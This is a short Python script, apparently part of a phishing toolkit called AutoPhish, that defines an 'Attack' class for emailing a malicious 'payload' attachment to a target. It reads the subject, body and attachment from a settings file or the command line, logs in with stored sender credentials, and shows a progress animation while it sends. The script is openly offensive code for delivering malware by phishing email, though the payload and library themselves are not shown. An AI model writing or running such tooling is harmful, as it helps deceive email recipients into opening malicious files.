#Coded by Mulvun
import sys

from Imports import AutoPhish, Pretty
from settings import *


class Attack(AutoPhish.DropBear, Pretty.Logo):

    def __init__(self, subject, text, files):
        super().__init__(email_from, email_to, password_from, password_to, host_server)
        self.animation = Pretty.Animation()
        self.subject = subject
        self.text = text
        self.files = files

    @Pretty.Logo.wrap
    def run(self):
        self.animation.start(f'Sending {self.files}')
        self.send_mail(subject=self.subject, text=self.text, payload=self.files)
        self.animation.done()


if __name__ == '__main__':
    try:
        if not attachment:
            attachment = sys.argv[1]
    except IndexError:
        raise AutoPhish.DropBearError('No payload specified.')
    a = Attack(subject=header, text=body, files=attachment)
    a.run()